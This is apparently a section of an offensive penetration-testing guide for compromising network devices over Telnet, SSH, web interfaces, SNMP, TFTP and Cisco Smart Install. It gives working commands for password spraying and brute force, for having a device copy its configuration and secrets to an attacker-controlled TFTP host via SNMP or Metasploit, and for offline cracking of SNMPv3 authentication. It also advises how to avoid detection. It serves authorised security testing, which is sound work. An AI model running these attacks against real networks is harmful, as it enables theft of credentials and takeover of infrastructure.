**Detection and opsec.** Successful and failed logins generate syslog. On Cisco IOS the relevant messages are the `%SEC_LOGIN-4-LOGIN_FAILED` and `%SEC_LOGIN-5-LOGIN_SUCCESS` family, and if the device is configured with `login on-failure log` and `login on-success log` these are unmissable in a SIEM that ingests device syslog. <!-- VERIFY: message names are from memory; confirm the exact mnemonics against the IOS system message guide for the target train --> Where authentication is via TACACS+, every attempt including every failure is recorded centrally on the TACACS+ server along with the source address, and TACACS+ also logs command accounting, meaning a defender can see every command you typed. That is a materially higher detection risk than most operators assume: TACACS+ command accounting is the closest thing the network world has to endpoint telemetry, and where it is deployed it is usually deployed thoroughly.

Also consider the failed-login lockout. Many devices support `login block-for` style throttling that disables all login attempts from all sources for a period after a threshold of failures. Triggering it is a denial of service on the device's management plane, it is extremely visible, and it will get you a phone call.

**Failure modes.**

- Connection refused: Telnet not enabled, which on Cisco means the VTY lines have `transport input ssh` or `transport input none`.
- Connection accepted then immediately closed: an access class list on the VTY lines is rejecting your source address. The device is reachable but you are not an approved management source. Retry from a compromised host inside the management network.
- Prompt appears but every credential fails and failures are instant: authentication is going to TACACS+ or RADIUS and your usernames do not exist. Stop guessing and go after the authentication server or find a real account.
- Prompt appears and credentials fail slowly with a long pause: the AAA server is unreachable from the device and it is timing out before falling back to local authentication. The local fallback credential is the interesting one and it is often much weaker than the domain credential. This is a genuinely useful signal.
- All VTY lines in use: you have exhausted the session limit, possibly by leaving hung sessions behind. Wait for the idle timeout.

### SSH

**What it is.** The credentialed management path on essentially every current device, and the one you will actually use once you have credentials.

**Why the version and algorithm set matter.** Network device SSH implementations lag general-purpose ones badly, because the SSH stack is compiled into a firmware image with a multi-year release cycle. The practical consequences are three. First, algorithm negotiation is a firmware-age oracle: a device offering `diffie-hellman-group1-sha1`, `ssh-rsa` with SHA-1, `3des-cbc` or `hmac-sha1-96` is running something old, and old firmware means unpatched published vulnerabilities in the rest of the image, not just in SSH. Second, your modern OpenSSH client will refuse to connect to these devices at all, and the fix is to explicitly re-enable the legacy algorithms rather than to conclude the port is broken. Third, small or reused host keys are a real finding: some device families historically generated host keys from insufficient entropy at first boot, and identical host keys across multiple devices in a fleet, which you can detect trivially by hashing the keys you collect, means the private key is either shared, factorable, or shipped in the image.

**Preconditions.** TCP 22 reachable and credentials, or a key.

```bash
# Legacy algorithm negotiation. Without these, a current OpenSSH client
# simply refuses and you will wrongly conclude the service is broken.
ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 \
    -o HostKeyAlgorithms=+ssh-rsa,ssh-dss \
    -o PubkeyAcceptedAlgorithms=+ssh-rsa \
    -o Ciphers=+aes128-cbc,3des-cbc \
    -o MACs=+hmac-sha1 \
    $USER@$TARGET

# Full algorithm and key audit, including a verdict on each algorithm.
ssh-audit $TARGET

# Collect host keys across the fleet, then look for duplicates.
# Identical fingerprints across distinct devices is a reportable finding.
for h in $(cat $TARGETS); do ssh-keyscan -T 5 "$h" 2>/dev/null; done | tee hostkeys.txt
awk '{print $2, $3}' hostkeys.txt | sort | uniq -c | sort -rn | head
```

**Credential testing over SSH.** Be more careful than you would be against a Linux host. Network devices have a small fixed number of concurrent management sessions, embedded SSH implementations handle concurrency poorly, and a parallel brute force against a switch's management plane can consume enough CPU to affect the control plane on smaller platforms. Single-threaded, low-rate, and with a short curated credential list.

```bash
# One connection at a time, stop on first success.
hydra -L users.txt -P passwords.txt -t 1 -W 3 -f ssh://$TARGET

# Spraying one credential across the fleet is usually the better shape,
# because network device credentials are fleet-wide, not per-device.
hydra -l $USER -p $PASS -t 4 -M $TARGETS ssh
```

**The spray, not the brute.** This is the key operational insight for device credentials. Because administration is centralised, the interesting question is almost never "what is the password on this switch" but "does this one credential work on all three hundred switches". A single valid credential sprayed across the fleet is one login attempt per device, which is quiet, versus a thousand attempts against one device, which is loud and yields nothing because the account does not exist locally. Once you have any device credential from any source, spray it fleet-wide immediately.

**Detection and opsec.** Same as Telnet: device syslog, and central TACACS+ or RADIUS accounting including command accounting. Additionally, SSH key-based access leaves the authorised key in the configuration, which means it appears in the next configuration diff.

**Failure modes.**

- `Unable to negotiate with $TARGET port 22: no matching key exchange method found`: legacy device, use the algorithm options above. The error message names the algorithms the device offered, which is itself the fingerprint you wanted.
- `Permission denied (publickey)`: password authentication is disabled and key authentication is required. Look for the private key on management jump hosts and in configuration management repositories.
- Connects, authenticates, then drops immediately: you have authenticated to a restricted shell that expects a specific command, or the account is authorised only for a specific subsystem such as NETCONF. Try `ssh -s $USER@$TARGET netconf`. <!-- VERIFY: subsystem invocation syntax for NETCONF over SSH; confirm against the target vendor's NETCONF documentation -->
- Authenticates to a limited prompt with no configuration visibility: you have a non-privileged account. On IOS you need `enable`, on Junos you need a class with the right permissions, on FortiOS you need an admin profile with read access to the relevant scope.

### HTTP and HTTPS management interfaces

**What it is.** The web administration interface, present on essentially every device class and the primary interface on every appliance.

**Why it is the richest surface.** The command line interface of a network device is a mature, narrow, heavily exercised piece of code. The web interface is a web application, often written later, often bolted onto a CGI or a proprietary web server running as root, often parsing session tokens and file paths and user-supplied strings that end up in a shell. It is also the interface that gets new features. The result is a consistent pattern across every vendor: the serious pre-authentication vulnerabilities in network appliances are overwhelmingly in the web management plane and the web-facing VPN portal, not in the routing or switching code. The Cisco IOS XE web UI issue tracked as CVE-2023-20198, an unauthenticated privilege escalation in the HTTP server feature that allowed creation of a privileged account, chained with CVE-2023-20273 for elevated command execution and implant installation, is the canonical demonstration: the routing platform was fine, the web UI was not, and tens of thousands of devices were implanted.

**Default credentials.** Still productive, and more productive on network kit than anywhere else in the estate, because devices are commissioned by installers, because the management interface is on an internal network that is presumed safe, and because a device that works is a device nobody revisits. The highest-yield categories are out-of-band management processors, environmental and power devices, wireless access points deployed outside the controller, small-branch routers, KVM and console servers, and anything that arrived as part of a project rather than through the standard build process. Rather than reciting a credential list, which ages badly and varies by firmware, work from the fingerprint: identify the exact model, then look up that model's documented default in the vendor's own installation guide, which will tell you the default username, the default password, and whether the device forces a change at first login. Devices that do not force a change at first login are the ones to concentrate on.

```bash
# Identify what you are looking at before guessing anything.
nmap -p 80,443,8080,8443,10443 --script http-title,http-headers,ssl-cert -iL $TARGETS

# Nmap's default account script covers a reasonable set of appliance defaults.
nmap -p 80,443 --script http-default-accounts --script-args http-default-accounts.category=routers -iL $TARGETS

# Where the login is a form, drive it directly. Get the exact failure
# string from a manual attempt first; a wrong failure string makes every
# attempt look successful.
hydra -L users.txt -P passwords.txt -f $TARGET http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid credentials"
```

**Authentication bypass rather than credential guessing.** On appliances, prefer looking for the bypass. The recurring classes, described in more detail in the edge device section below, are path-based access control bypasses where a prefix or suffix on the URL causes the authorisation check to be skipped, session tokens that can be obtained or predicted without authentication, API endpoints that were never wired into the authorisation layer at all, and memory disclosure that leaks a valid session token. All four have appeared repeatedly across every major vendor. Enumerate the API surface, not just the UI: appliance web interfaces are almost always a JavaScript front end talking to a REST or XML API, and the API frequently has endpoints the UI never calls and the authorisation layer never covered.

```bash
# Enumerate the API surface as well as the UI. Look for /api, /rest,
# /restconf, /cgi-bin, /remote, /php, and vendor-specific prefixes.
ffuf -u https://$TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -k -mc all -fc 404

# RESTCONF, where present, is a full configuration read and write API.
curl -sk -u $USER:$PASS -H 'Accept: application/yang-data+json' \
  https://$TARGET/restconf/data/ietf-interfaces:interfaces
```

**Detection and opsec.** Web management access is logged by the device, and on appliances it is logged in an application log that is frequently forwarded. Failed logins are logged and often trigger a lockout. Directory and API enumeration against an appliance generates a large volume of 404s in the web log, which is one of the few things on a network device that a defender might actually alert on, because appliance vendors ship detection guidance for exactly this after each round of exploitation. Rate limit, and prefer a targeted list of vendor-specific paths over a generic wordlist.

**Failure modes.**

- TLS handshake failure: the appliance offers only old TLS versions or ciphers. Force them explicitly, or use a container with an older OpenSSL. `curl --tlsv1.0 --ciphers DEFAULT@SECLEVEL=0` works for many cases. <!-- VERIFY: SECLEVEL syntax depends on the OpenSSL build; confirm on your host -->
- HTTP 403 on everything including the login page: source-address restriction on the management interface. You are not coming from an approved network.
- Login succeeds in the browser but not from a script: the login flow sets a CSRF token and a session cookie in separate steps, or requires a specific `Referer`. Capture the real flow through a proxy and replay it exactly.
- Everything returns the login page with 200: the application is not using status codes for authorisation state. Match on body content, not on status.

### SNMP

The Network Enumeration section covers SNMP discovery, community string guessing, the read-access data set and the OID map. What follows is the part that matters most and which that section only gestures at: what write access actually gives you, and why SNMP is the highest-value low-effort finding on a network device.

#### Community string guessing

**Why it works.** SNMPv1 and v2c authenticate with a community string, a plaintext shared secret carried in every packet with no challenge, no encryption and no session. Because the transport is UDP and there is no account to lock, guessing is unlimited, unthrottled and, on the overwhelming majority of devices, unlogged beyond an optional `authenticationFailure` trap that nobody has a receiver for. This is the most favourable guessing environment anywhere in the estate.

**What actually works as a candidate list.** The vendor defaults `public` and `private` remain productive. Beyond those, the strings that succeed are organisational: the company name, the company name with a number or year, the site or building code, the monitoring platform name, the device class, `ro` and `rw` variants of any of these, and the string you already found in another device's configuration. That last one is the important one. Community strings are configured fleet-wide by the same automation that configures everything else, so one configuration file gives you the string for every device in the estate, including the write string. Extract one config, then re-sweep with the strings you found.

```bash
# Sweep. Keep the community list short and organisation-specific.
onesixtyone -c communities.txt -i snmp-hosts.txt
nmap -sU -p161 --script snmp-brute --script-args snmp-brute.communitiesdb=communities.txt -iL $TARGETS

# Confirm a hit and identify the device in one request.
snmpget -v2c -c $COMMUNITY -Oqv $TARGET 1.3.6.1.2.1.1.1.0
```

**The critical ambiguity.** SNMP's response to a wrong community string is silence, not an error, and silence is indistinguishable from a filtered port. You must establish port state separately before you can interpret a non-response as an authentication failure. A UDP scan that observes ICMP port-unreachable establishes closed; absence of that ICMP plus absence of a reply means either open-and-wrong-string or filtered. Get this wrong and you will write off a whole subnet of devices that were answering all along.

**Distinguishing read from write.** A read community lets you `snmpget` and `snmpwalk`. A write community additionally lets you `snmpset`. Never assume; test explicitly, and test with something harmless. The conventional safe test is writing back the value the device already has for a benign object, most commonly `sysName` or `sysLocation`, so that a successful write changes nothing. Read the current value first, write exactly that value, and confirm the response is the value rather than an error.

```bash
# Read the current value.
snmpget -v2c -c $COMMUNITY -Oqv $TARGET 1.3.6.1.2.1.1.6.0

# Write it straight back. A no-op write that returns the value proves
# write access without changing any state.
snmpset -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.1.6.0 s "$EXISTING_VALUE"
```

The error you get on failure is diagnostic. `noSuchName` on v1 or `noAccess` on v2c means the string is read-only for that object. A timeout means the string is wrong entirely, or the write is permitted only from specific source addresses. `notWritable` means the object itself is read-only regardless of your access level, so retry with a different object before concluding you have no write access.

#### Read access as reconnaissance

Worth restating compactly because it is chronically underused. A read community on a router or switch returns the interface inventory with descriptions and states, every configured IP address and mask, the ARP cache, the IP routing table, and the CDP or LLDP neighbour table. Take these in turn.

The **ARP cache** of a distribution switch is a list of live hosts in every VLAN that switch serves, including VLANs you cannot reach. This is host discovery for unreachable segments, obtained without sending a packet to any of them.

The **routing table** is a map of the organisation's internal structure. Every subnet that exists, including the ones the scope document did not mention, the ones at other sites, the ones behind VPN tunnels, and the management networks. Static routes are especially informative because each one exists because something needed special treatment.

The **neighbour table** from CDP or LLDP is the physical topology with hostnames, platforms, software versions and management addresses. Walk it recursively and you have mapped the network's device layer from one read community.

The **interface descriptions** are free documentation, as discussed above.

```bash
# Bulk walk the whole tree once, to a file, and mine offline.
snmpbulkwalk -v2c -c $COMMUNITY -Cr50 $TARGET .1 > $TARGET-snmp.txt

# The specific tables, if you want to be surgical rather than noisy.
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.4.22    # ipNetToMediaTable, the ARP cache
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.4.21    # ipRouteTable, the routing table
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.2.2     # ifTable, interfaces
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.31.1.1.1.18  # ifAlias, the descriptions
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.4.1.9.9.23  # CISCO-CDP-MIB, neighbours
snmpwalk -v2c -c $COMMUNITY $TARGET 1.0.8802.1.1.2       # LLDP-MIB, neighbours
```

A full-tree walk against a production core device is not free. It can consume noticeable CPU on the device's management plane on older platforms, and it generates a large volume of UDP that a network monitoring system may notice as an anomaly. Prefer targeted subtree walks on core kit and reserve full walks for access-layer devices and for a device you already have configuration access to.

#### Write access: configuration extraction and modification

**This is the highest-value SNMP outcome and it deserves to be understood as compromise rather than enumeration.** A read-write community on a network device is equivalent to administrative access, because the management protocol includes, by design, the ability to instruct the device to transfer its own configuration to an arbitrary server.

**Why it works.** Configuration management platforms need to back up device configurations. Rather than requiring the platform to log in and screen-scrape, Cisco exposes `CISCO-CONFIG-COPY-MIB` under `1.3.6.1.4.1.9.9.96`, which lets a management station create a row in a copy table specifying a protocol, a source file type, a destination file type, a server address and a filename, and then set the row to active to execute the transfer. The device then initiates a TFTP, FTP, SCP or HTTP transfer of its own running or startup configuration to the address you named. There is no additional authentication: the write community is the authorisation. The same mechanism works in reverse, uploading a configuration file from your server into the device's running or startup configuration, which is arbitrary configuration change over UDP with a shared secret. Equivalent mechanisms exist on other vendors' private MIBs and on older Cisco platforms via the deprecated `OLD-CISCO-SYSTEM-MIB` write objects.

**What it yields.** The complete running configuration, which is everything in the configuration mining section below: the enable secret, every local account hash, every SNMP community string including the write string for the whole fleet, the RADIUS and TACACS+ shared secrets, VPN pre-shared keys, wireless passphrases, the full routing and VLAN topology, and every access control list. From one read-write community on one access switch you frequently obtain the credentials to administer the entire network.

**Preconditions.** A write community, UDP 161 reachable from your position, and, critically, network reachability from the *device* to your TFTP server on UDP 69. That second condition is the usual failure: the device may be able to reach a management network but not your position, and management access lists frequently permit the device to talk only to sanctioned servers. If the device cannot reach you, the transfer silently fails and the row status reports an error.

```bash
# Stand up a TFTP server that will accept an upload.
sudo mkdir -p /srv/tftp && sudo chmod 777 /srv/tftp
sudo atftpd --daemon --port 69 --bind-address $ATTACKER /srv/tftp
# Or from Metasploit, which is convenient because the module below uses it.
msfconsole -q -x "use auxiliary/server/tftp; set TFTPROOT /srv/tftp; set SRVHOST $ATTACKER; run -j"
```

The easiest reliable route is the Metasploit module, which builds the copy table row, triggers the transfer, runs the TFTP server and loots the file for you.

```bash
msfconsole -q -x "use auxiliary/scanner/snmp/cisco_config_tftp; \
  set RHOSTS file:$TARGETS; \
  set COMMUNITY $COMMUNITY; \
  set LHOST $ATTACKER; \
  set SOURCE 4; \
  set OUTPUTDIR ./loot/configs; \
  set THREADS 4; run; exit"
```

`SOURCE 4` is the running configuration and `SOURCE 3` is the startup configuration. Take both where you can: they differ when someone has made an unsaved change, and the startup configuration is what the device will look like after the next reload, which matters if you are assessing whether a control is durable.

Doing it by hand with `snmpset` is worth understanding even if you use the module, because the module only handles Cisco and because knowing the mechanism lets you adapt when the copy table objects differ. The sequence is: pick an arbitrary unused row index, set the protocol to TFTP, set the source file type to running configuration, set the destination file type to network file, set the server address to your host, set the filename, then set the row status to `createAndGo` which both creates and activates the row. You then poll the copy state until it reports success or failure and delete the row afterwards.

```bash
# Illustrative sequence against CISCO-CONFIG-COPY-MIB with row index 111.
# Object numeric OIDs are under 1.3.6.1.4.1.9.9.96.1.1.1.1.<object>.<row>
# and the enumerations are protocol tftp, source runningConfig,
# destination networkFile, rowStatus createAndGo.
snmpset -v2c -c $COMMUNITY $TARGET \
  1.3.6.1.4.1.9.9.96.1.1.1.1.2.111 i 1 \
  1.3.6.1.4.1.9.9.96.1.1.1.1.3.111 i 4 \
  1.3.6.1.4.1.9.9.96.1.1.1.1.4.111 i 1 \
  1.3.6.1.4.1.9.9.96.1.1.1.1.5.111 a $ATTACKER \
  1.3.6.1.4.1.9.9.96.1.1.1.1.6.111 s "$TARGET-running.cfg" \
  1.3.6.1.4.1.9.9.96.1.1.1.1.14.111 i 4

# Poll the copy state, then tidy up the row.
snmpget -v2c -c $COMMUNITY $TARGET 1.3.6.1.4.1.9.9.96.1.1.1.1.10.111
snmpset -v2c -c $COMMUNITY $TARGET 1.3.6.1.4.1.9.9.96.1.1.1.1.14.111 i 6
```

<!-- VERIFY: the numeric sub-identifiers for ccCopyProtocol, ccCopySourceFileType, ccCopyDestFileType, ccCopyServerAddress, ccCopyFileName, ccCopyState and ccCopyEntryRowStatus, and the enumeration integers, are from memory. Confirm against the CISCO-CONFIG-COPY-MIB definition or Cisco's "How To Copy Configurations To and From Cisco Devices Using SNMP" document before relying on this by-hand form. The Metasploit module encodes the correct values and is the safer route. -->

**Verify it worked.** A file appears in your TFTP root. Check its size and its first lines: a truncated file means the transfer was interrupted, and a zero-length file means the device created the file then failed. Poll the copy state object; it reports a distinct value for success and for each failure class. Then confirm the content is a real configuration by looking for the version banner at the top and the `end` at the bottom.

**Detection and opsec.** This is the loudest thing in this subsection and you should know that going in. The device logs a configuration copy operation. Where the device has command accounting or configuration change logging to a central system, the copy appears there. Network management platforms that track configuration changes will notice a configuration read they did not initiate, and, more tellingly, some will notice the `ccCopyEntry` row appearing and disappearing. The TFTP transfer itself is an unusual flow: a core switch initiating UDP 69 to a workstation address is an anomaly that even a modest NetFlow-based detection will surface. Mitigate by sourcing the transfer to an address that looks like management infrastructure if you have one, by taking the configuration once rather than repeatedly, and by preferring an authenticated CLI session and a normal `show running-config` where you have credentials, because that is far more ordinary-looking traffic.

**Failure modes.**

- `snmpset` returns `noAccess` or `notWritable`: the community is read-only. Confirm with a benign write test on `sysLocation`.
- `snmpset` succeeds, copy state reports a failure: the device cannot reach your TFTP server. Check with a packet capture on your side for any inbound UDP 69 at all. If nothing arrives, it is a routing or filtering problem between the device and you, not a permissions problem.
- Copy state reports success but no file: your TFTP server is not permitting file creation. `atftpd` will not create a file that does not exist in some configurations; touch the filename first and make it world-writable.
- Row creation fails with an index conflict: another row exists at your chosen index, possibly a real backup job. Pick a different index. Do not delete a row you did not create.
- Everything works on one device and nothing works on the rest: the write community is per-device rather than fleet-wide, which is rare, or the others have an SNMP access list restricting the write community to the management platform's address.

#### SNMPv3

**What it is.** The version that fixes the model, with per-user authentication using HMAC and optional privacy using DES or AES, and a security level of `noAuthNoPriv`, `authNoPriv` or `authPriv`.

**Why it is still worth attacking.** Three reasons. First, deployment is frequently partial: v3 is configured, but v2c is left enabled alongside it for the older monitoring system that never got migrated, so the weak path remains. Second, v3 leaks usernames. An unknown user produces a report PDU that increments `usmStatsUnknownUserNames` and is distinguishable from the response to a known user with a bad password, so you can enumerate valid SNMP users without any credential. Third, the authentication is an HMAC over the PDU keyed on a password-derived key, which means a captured `authNoPriv` or `authPriv` exchange yields an offline crackable artefact. Where you can capture SNMPv3 traffic between a management station and a device, and SNMP polling traffic is continuous and predictable so capturing it is easy from an on-path position, you can attack the authentication password offline.

```bash
# Username probing. A valid username gives a different response
# to an invalid one even at noAuthNoPriv.
snmpwalk -v3 -l noAuthNoPriv -u $SNMPUSER $TARGET .1

# Authenticated access once you have a user and password.
snmpwalk -v3 -l authPriv -u $SNMPUSER -a SHA -A "$AUTHPASS" -x AES -X "$PRIVPASS" $TARGET .1

# Offline cracking of a captured v3 authentication exchange.
hashcat -m 25100 snmpv3.hash wordlist.txt   # HMAC-MD5-96
hashcat -m 25200 snmpv3.hash wordlist.txt   # HMAC-SHA1-96
```

<!-- VERIFY: extraction of an SNMPv3 hash into hashcat format from a pcap. The hashcat modes 25100 and 25200 exist for SNMPv3 HMAC-MD5-96 and HMAC-SHA1-96; confirm the current extraction path, which has historically been a community script rather than a first-party tool. -->

Note that the SNMPv3 authentication password and privacy password appear in the device configuration in the same way every other secret does, usually in a localised-key form derived from the password and the engine ID. That form is not directly reversible to the password, but it is directly usable as the key material for authenticating to that specific device, which is the thing you actually wanted. <!-- VERIFY: whether a given vendor stores the localised key or the plaintext password in the configuration varies; check the specific platform. -->

**Failure modes.**

- `Authentication failure (incorrect password, community or key)`: username valid, credentials wrong.
- `Unknown user name`: username invalid. Useful, that is the enumeration signal.
- `Unsupported security level`: the device requires `authPriv` and you asked for less.
- Works with `-a SHA` but not `-a MD5` or vice versa: the auth protocol must match exactly. Modern devices may also require SHA-224 or above, in which case older `net-snmp` builds will not negotiate.

### TFTP and FTP for configuration transfer

**What it is.** TFTP on UDP 69 and FTP on TCP 21 exist on internal networks almost exclusively to move device configurations and firmware images. Finding either is finding the configuration archive.

**Why it works.** TFTP has no authentication at all. None. There is no user, no password and no access control in the protocol; the only control is whatever the server implementation offers, typically a root directory and optionally a read-only flag. It survives because network device bootstrap and firmware upgrade procedures depend on it, and because it is the transport the SNMP configuration copy mechanism uses. FTP on device archive servers is frequently configured with a shared account whose credentials are in every device configuration, or with anonymous access, because the device needs to authenticate non-interactively and nobody wanted to manage keys.

**What it yields.** Two distinct wins. Reading known filenames from a TFTP server gets you configurations directly. Being the destination for a device's own backup gets you configurations you asked for. And where the TFTP server permits write, you can replace a firmware image or a configuration that a device will later fetch, which is a supply chain position over the device fleet.

**The filename problem.** TFTP has no directory listing, so you must guess. The productive list is short and specific, because these names come from vendor procedures rather than imagination.

```bash
# Enumerate candidate filenames. There is no listing, so this is
# a guessing exercise against a short, high-quality list.
nmap -sU -p69 --script tftp-enum --script-args tftp-enum.filelist=tftp-names.txt $TARGET

# Manual fetch.
tftp $TARGET -c get running-config
curl -s tftp://$TARGET/running-config -o running-config
```

Candidate names worth trying: `running-config`, `startup-config`, `config.text`, `vlan.dat`, `<hostname>-confg`, `<hostname>.cfg`, `network-confg`, `cisconet.cfg`, `router-confg`, `switch-confg`, `sysconfig`, `backup.cfg`, and the Cisco IP phone provisioning files `SEP<MAC>.cnf.xml` and `XMLDefault.cnf.xml`, which contain SIP registration credentials and the call manager addresses. Also try the hostnames you already learned from CDP, LLDP and SNMP with each of the common suffixes, because device backup jobs are almost always named after the device.

**Where you find TFTP, you have also found the archive.** This is the point that gets missed. A TFTP server on an internal network is the destination that hundreds of devices upload their configurations to. Its filesystem is the entire fleet's configuration set in one directory. If you can get shell on that host, or if the same directory is exposed over SMB, NFS, HTTP or FTP as well, you do not need to attack any device individually. Check for the same directory served twice: an archive directory exposed over TFTP for the devices and over SMB for the engineers is extremely common, and the SMB side may have weak or absent permissions.

```bash
# FTP archive: check anonymous, then check credentials found in configs.
curl -s ftp://$TARGET/ --user anonymous:anonymous
nmap -p21 --script ftp-anon,ftp-syst $TARGET
```

**Detection and opsec.** TFTP reads are logged by some server implementations and by none of the others. FTP logs authentication. The device-initiated transfers are visible in flow data as discussed above. Reading from an archive server is quiet; writing to one is a change that a file integrity monitor or a configuration management system may detect, and overwriting a firmware image is a change with a very long fuse and a very large blast radius, so treat it accordingly.

**Failure modes.**

- Timeout on every filename: the server is bound but restricted by source address, or the file genuinely does not exist and the server does not respond to a request for a missing file rather than returning an error. Both look identical.
- `Error code 1: File not found`: the server is working and the name is wrong. This is the good failure, because it confirms the service is usable.
- `Error code 2: Access violation`: the file exists but the server will not serve it, or the path escapes the root. Some implementations are vulnerable to traversal, which is worth one careful attempt with `../`.
- Transfer starts and stalls: UDP fragmentation or a firewall dropping the data stream on the ephemeral port. TFTP uses a fresh port for the transfer, so stateful inspection that does not understand TFTP breaks it.

### Cisco Smart Install and similar bootstrap protocols

**What it is.** Smart Install is a zero-touch provisioning feature on some Catalyst platforms, listening on TCP 4786 on the director and on clients, with no authentication in the protocol.

**Why it works.** The protocol was designed for a trusted provisioning network and shipped enabled by default on affected platforms. It permits an unauthenticated peer to instruct the device to fetch and apply a configuration, and to trigger a configuration copy. The absence of authentication is the design, not a bug, which is why it was addressable only by disabling the feature. The remotely triggerable buffer overflow tracked as CVE-2018-0171 sits on top of the same unauthenticated surface.

**What it yields.** Configuration read on affected devices with no credentials at all, and configuration write, which is complete device compromise. Where you find 4786 open, it is the shortest path from nothing to everything on that device.

```bash
# Identify.
nmap -p4786 -sV --open -iL $TARGETS
msfconsole -q -x "use auxiliary/scanner/misc/cisco_smart_install; set RHOSTS file:$TARGETS; run; exit"
```

Public exploitation tooling exists under the name Smart Install Exploitation Tool, with several forks, and a separate configuration dumper variant. These are community Python tools of varying maintenance quality, several written for Python 2, so read the source before running them and expect to fix imports. <!-- VERIFY: current maintained fork and its exact invocation flags; the tooling is community-maintained and the flag set differs between forks. -->

**Detection and opsec.** The device logs Smart Install activity. The configuration transfer is a TFTP flow as above. Because the affected feature has been the subject of repeated public advisories and government advisories about exploitation by state-aligned actors, any monitoring the organisation has deployed around network devices is disproportionately likely to cover this specific protocol. Treat it as high signal.
